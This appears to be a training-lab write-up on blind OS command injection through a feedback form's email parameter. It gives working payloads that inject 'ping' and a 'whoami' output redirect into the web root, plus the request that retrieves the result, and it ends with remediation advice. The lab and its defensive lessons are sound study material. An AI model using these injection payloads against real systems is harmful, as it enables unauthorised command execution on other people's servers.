## 🧪 Lab: Blind OS Command Injection with Output Redirection  
**Level**: Practitioner  
**Date**: June 19, 2025  
**Goal**: Exploit a blind OS command injection vulnerability by redirecting command output to a file and retrieving it via the web server.

---

### 🧰 Tools  
- Burp Suite (Repeater / Interceptor)  
- Output redirection payloads (`whoami > ...`)  
- Static resource fetch via browser

---

### 🧭 Steps

1. Intercept the vulnerable request:
POST /feedback/submit  
Parameters include:
email=xyz@gmail.com
message=Test

2. Send the request to Repeater.

3. Test for basic blind injection using:
```
email=xyz@gmail.com||ping+-c+5+127.0.0.1||
```

✅ Delayed response indicates injection point confirmed.

4. Use output redirection to write command result to a static directory:
```
email=xyz@gmail.com||whoami+>+/var/www/images/output.txt||
```

✅ 200 OK indicates command likely executed.

5. Retrieve the output via browser:
```
GET /images/output.txt
```


✅ File contains result of `whoami` command.

---

### 💣 Payload


```
xyz@gmail.com||whoami+>+/var/www/images/output.txt||
```

---

### 💡 Observations

- Blind injection confirmed through delay
- Output successfully written to file served by web root
- Payload relies on the app writing unsanitized shell args

---

### 🔒 Remediation

- Never interpolate user input in shell calls
- Avoid using `system()` or shell equivalents; prefer safe libraries
- Restrict filesystem access for web apps
- Sanitize inputs and enforce strict allow-lists
- Disable file access where unnecessary (e.g., /var/www exposure)